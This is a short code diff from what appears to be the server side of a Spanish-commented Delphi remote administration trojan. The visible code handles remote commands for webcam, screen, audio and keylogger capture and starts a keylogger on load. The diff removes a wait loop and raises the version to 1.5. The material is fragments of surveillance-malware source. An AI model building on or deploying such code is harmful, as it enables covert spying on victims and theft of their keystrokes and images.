@@ -797,8 +797,6 @@ const
             end;
                     //El thread mira el cambio de la variable global CapturaPantalla,CapturaWebcam..., quizas no sea el mejor método...
 
-            while((CapturaWebcam <> '') or (CapturaPantalla<>'') or (CapturaThumb <> '') or (CapturaKeylogger<>'') or (CapturaAudio>'')) do sleep(1);  //En teoria no deberia pasar...
-
             if Copy(recibido, 1, 13) = 'CAPTURAWEBCAM' then
             begin                                                       //Se crea la captura de webcam desde aquí porque sino da error al hacer las llamadas a la dll desde el otro thread
               Delete(Recibido, 1, Pos('|', Recibido));
@@ -1199,7 +1197,7 @@ const
   procedure CargarServidor(P:Pointer);
   begin
     Configuracion := TSettings(P^); //Leemos la configuración que nos han mandado
-    VersionDelServer := '1.4';
+    VersionDelServer := '1.5';
     BeginThread(nil,0,Addr(KeepAliveThread),nil,0,id1);
     OnServerInitKeylogger(); //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
   
